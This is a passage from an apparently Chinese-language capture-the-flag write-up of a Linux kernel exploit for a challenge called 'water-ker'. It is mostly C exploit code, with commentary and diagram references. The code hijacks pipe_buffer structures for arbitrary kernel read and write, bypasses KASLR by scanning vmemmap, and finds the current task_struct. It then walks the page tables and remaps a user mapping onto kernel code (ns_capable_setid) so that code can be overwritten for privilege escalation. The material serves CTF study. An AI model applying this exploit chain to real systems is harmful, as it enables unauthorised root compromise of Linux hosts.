+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_4th_buf.len = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>初始化完毕就可以任意读写了，先是读arbitrary_read_by_pipe</p>
+<ul>
+<li><p>书接上回，每次任意读写的时候要使用pipe2初始化pipe3</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read11.png" srcset="/img/loading.gif" lazyload class title="read11">
+</li>
+<li><p>使用pipe3修改pipe1，指向要读写的页并初始化read指向页开始</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* page to read */</span><br>evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>evil_2nd_buf.page = page_to_read;<br>    <br><span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read22.png" srcset="/img/loading.gif" lazyload class title="read22">
+
+<p>接下来的write是为了跳过pipe1，准备修改pipe2</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>      temp_zero_buf, <br>      TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read33.png" srcset="/img/loading.gif" lazyload class title="read33">
+</li>
+<li><p>最开始pipe2用于初始化pipe3了，这里使用pipe3把pipe2再改回去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read44.png" srcset="/img/loading.gif" lazyload class title="read44">
+</li>
+<li><p>最终目的——把数据读出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* read out data */</span><br>read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read55.png" srcset="/img/loading.gif" lazyload class title="read55"></li>
+</ul>
+</li>
+<li><p>任意写arbitrary_write_by_pipe和任意读思路一致（除了pipe1的write的指向）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="任意读写设计思路"><a href="#任意读写设计思路" class="headerlink" title="任意读写设计思路"></a>任意读写设计思路</h3><p>到利用uaf泄露page这一步都是惯常操作</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" srcset="/img/loading.gif" lazyload class title="uaf">
+
+<ul>
+<li><p>self-pointing：要达成任意页读写首先我们要能够更改page指针，要更改page指针就要知道pipe_buffer地址再让page指向pipe_buffer……听起来很像死循环(ˉ▽ˉ；)…</p>
+<p>但由于我们已经泄露了一个page地址，所以让这个page上的pipe_buffer-&gt;page指向自己就能解决以上问题</p>
+</li>
+<li><p>三个pipe的更改类似于一个这样的循环</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E5%BE%AA%E7%8E%AF.png" srcset="/img/loading.gif" lazyload class title="循环">
+
+<ul>
+<li>首先需要一个更改pipe1-&gt;page的pipe3</li>
+<li>还需要一个将pipe3复原的pipe2</li>
+<li>pipe2还需要复原（又双叒叕循环了(ˉ▽ˉ；)…），由于pipe3处于高物理地址处所以可以一口气完成更改pipe1和pipe2的任务</li>
+</ul>
+</li>
+<li><p>所以大概一个过程就是</p>
+<ul>
+<li>pipe2复原pipe3</li>
+<li>pipe3更改pipe1指向要读写的page</li>
+<li>pipe3复原pipe2</li>
+</ul>
+</li>
+</ul>
+<h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>需要获得两个基址：vmemmap基址和kernel基址</p>
+<ul>
+<li><p>vmemmap</p>
+<ul>
+<li>在内存大于1G时，KASLR的粒度是256MB（0x10000000），我们可以通过存在物理地址physmem_base + 0x9d000（vmemmap[157]）处的secondary_startup_64函数指针判断是否找到了kernel基址</li>
+<li>由于我们之前已经有了一个page的地址，我们可以先将这个page的地址256MB对齐作为vmemmap基址，如果vmemmap[157]处有secondary_startup_64函数指针则基址正确，否则vmemmap-&#x3D;256MB，继续</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> *comm_addr;<br>  <br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>setup_evil_pipe();<br>  <br>vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br>  <br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0xe0</span>)) &#123;<br>        kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0xe0</span>;<br>        kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>               kernel_base, kernel_offset);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  <br>    vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br></code></pre></td></tr></table></figure>
+
+<p><em>ps：关于kaslr的所有内容都是根据注释来的，不清楚原理，感觉要研究原理又要开始系统启动了捏~(￣▽￣)~*</em></p>
+</li>
+<li><p>current task_struct</p>
+<ul>
+<li><p>task_struct结构体有一个comm成员会记录进程的名称，是一个十六字节的字符数组</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-type">char</span>	comm[<span class="hljs-number">16</span>];	<span class="hljs-comment">/*  2960    16 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>prctl系统调用可以修改进程的名称，这个进程名之后会作为内存搜索的目标来定位task_struct</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br>    <br>prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>搜索comm，并根据comm定位task_struct，task_struct的ptraced指针是指向自己的，这样我们就能获取task_struct的地址</p>
+<p>因为task_struct是存在直接映射区（heap）上的，且在内存小于256M时heap_base &#x3D; heap_leak &amp; 0xfffffffff0000000，这样我们就能获得直接heap基址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br><br>    comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>    <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br>    <br>        <span class="hljs-comment">/* task-&gt;read_parent */</span><br>        parent_task = comm_addr[<span class="hljs-number">-61</span>];<br>    <br>        <span class="hljs-comment">/* task_struct::ptraced */</span><br>        current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br>    <br>        page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>        page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br>    <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>               (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>               page_offset_base);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>               <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>三种提权方法</p>
+<h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>考虑直接更改内核代码段(○´･д･)ﾉ</p>
+<p>但直接映射区对应的代码段区域没有w权限，直接写入会造成kernel panic</p>
+<p>改写代码段本质上是向对应的物理页写入数据，上文我们已经获得了task_struct的地址，我们可以考虑更改进程页表建立一个到内核代码段的映射，这样就能改写了：）</p>
+<p>方便起见先mmap一段地址，再改写这段地址的页表，这就是usma \ ^o^ &#x2F;</p>
+<ul>
+<li><p>先说明一下这个地址转换函数direct_map_addr_to_page_addr，用于将直接映射区的地址转化为所属页的page结构体地址（page_offset_base是直接映射区基址）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>先调用pgd_vaddr_resolve找页表地址</p>
+<ul>
+<li><p>从task_struct所在页读取内容（读两页），并获取mm和stack的地址，定位mm_struct所在的页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br>    <br><span class="hljs-comment">/* read current task_struct */</span><br>current_task_page = direct_map_addr_to_page_addr(current_task);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br>    <br>tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>stack_addr = tsk_buf[<span class="hljs-number">4</span>] + <span class="hljs-number">0x3000</span>;<br>mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br>    <br>mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>读mm_struct，定位页表pgd</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* read mm_struct */</span><br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br>    <br>mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br>    <br><span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>mmap一段内存并且先往里面写点东西，因为mmap不会先分配内存页，第一次写入才会分配内存页，需要两页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810eab50</span><br>  <br><span class="hljs-type">char</span> *kcode_map, *kcode_func;<br><span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br>  <br>kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                 MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>&#125;<br>  <br><span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>    kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要更改的目标函数是ns_capable_setid，这里计算的是虚拟地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>       dst_vaddr);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>接下来就是调用vaddr_resolve_for_3_level查找ns_capable_setid对应的页表项，因为进程的页表也映射了内核空间</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>先看一些与页表有关的宏</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br></code></pre></td></tr></table></figure>
+
+<p>由于PDE的PS位置一，所以PDE直接映射到2M的页，其实只有三级页表，放一张四级页表的图意思一下：）</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E9%A1%B5%E8%A1%A8.png" srcset="/img/loading.gif" lazyload class title="页表">
+</li>
+<li><p>vaddr_resolve_for_3_level返回目标虚拟地址的物理地址</p>
+<p>对于每级页表</p>
+<ul>
+<li>先读取内容，读一页</li>
+<li>根据虚拟地址对应位数查找下一级页表的地址，还要去除低位和高位的标志位</li>
+<li>以上得出的是物理地址，加直接映射区基址转化为虚拟地址</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>pud_addr += page_offset_base;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>pmd_addr += page_offset_base;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br><span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>计算ns_capable_setid所在的小页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>调用vaddr_remapping把mmap映射的物理地址改为ns_capable_setid，改两页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remapping to our mmap area */</span><br>vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这里的PDE的PS位没有置一，所以是四级页表，思路和vaddr_resolve_for_3_level一样，多一步寻表和更改，更改处还要将页置为可写</p>
